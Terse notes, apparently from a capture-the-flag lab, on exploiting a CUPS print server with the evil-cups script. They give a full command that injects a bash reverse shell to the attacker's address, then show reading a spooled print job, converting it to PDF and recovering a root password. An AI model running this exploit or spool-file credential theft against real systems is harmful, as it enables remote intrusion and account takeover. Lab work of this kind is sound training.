https://github.com/IppSec/evil-cups

python3 evilcups.py 10.10.14.9 10.10.11.40 'nohup bash -c "bash -i >& /dev/tcp/10.10.14.9/443 0>&1"&'

![[Pasted image 20250203183101.png]]
then we fount completed job on one of the printers
![[Pasted image 20250204145758.png]]
The default location for print job files in CUPS is:
/var/spool/cups/
- Example: `d00001-001` (for job ID 1, page 1).
- Contains the actual print data (e.g., PostScript, PDF, or other formats).
cat /var/spool/cups/d00001-001
we get this file on our machine
ps2pdf d00001-001
The root password was contained in d00001-001.pdf file
Br3@k-G!@ss-r00t-evilcups